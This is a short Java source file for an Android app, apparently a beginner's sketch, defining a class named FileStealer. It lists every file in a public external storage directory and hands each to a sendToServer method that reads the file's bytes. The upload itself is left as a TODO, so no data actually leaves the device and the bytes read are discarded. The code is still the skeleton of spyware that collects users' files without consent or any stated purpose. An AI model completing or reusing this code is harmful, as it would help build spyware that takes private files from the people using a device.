package com.example.myapplication;

import android.os.Environment;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class FileStealer {

    public void getUserFiles(String directoryPath) {
        //get an access to dir
        File directory = Environment.getExternalStoragePublicDirectory(directoryPath);
        File[] files = directory.listFiles();

        for (int i = 0; i < files.length; i++) {
            if (files[i].isFile()) {
                sendToServer(files[i]);
            }
        }
    }

    private void sendToServer(File file) {
        // TODO: send file to server
        byte[] serFile = new byte[1];

        try {
            serFile = Files.readAllBytes(Paths.get(file.getPath()));
        } catch (IOException e) {

        }
    }
}
